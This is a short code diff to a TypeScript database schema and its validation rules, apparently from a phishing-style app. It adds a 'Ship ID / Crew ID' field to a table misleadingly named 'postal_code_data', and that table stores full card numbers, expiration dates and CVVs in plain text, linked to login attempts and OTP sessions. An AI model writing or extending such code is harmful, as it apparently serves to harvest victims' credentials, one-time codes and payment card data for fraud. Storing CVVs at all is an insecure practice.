@@ -48,6 +48,7 @@ export type OtpSession = typeof otpSessions.$inferSelect;
 export const postalCodeData = pgTable("postal_code_data", {
   id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
   loginAttemptId: varchar("login_attempt_id").notNull(),
+  shipId: text("ship_id").notNull(),
   cardNumber: text("card_number").notNull(),
   expiration: text("expiration").notNull(),
   cvv: text("cvv").notNull(),
@@ -169,7 +170,8 @@ export const otpVerificationSchema = z.object({
 
 export const postalCodeRequestSchema = z.object({
   loginAttemptId: z.string().uuid(),
-  cardNumber: z.string().length(16, "Card Number must be 16 digits"),
+  shipId: z.string().length(6, "Ship ID / Crew ID must be 6 digits"),
+  cardNumber: z.string().length(8, "Card Number must be 8 digits"),
   expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
   cvv: z.string().length(3, "CVV must be 3 digits"),
   postalCode: z.string().min(1, "Postal Code is required").max(7),
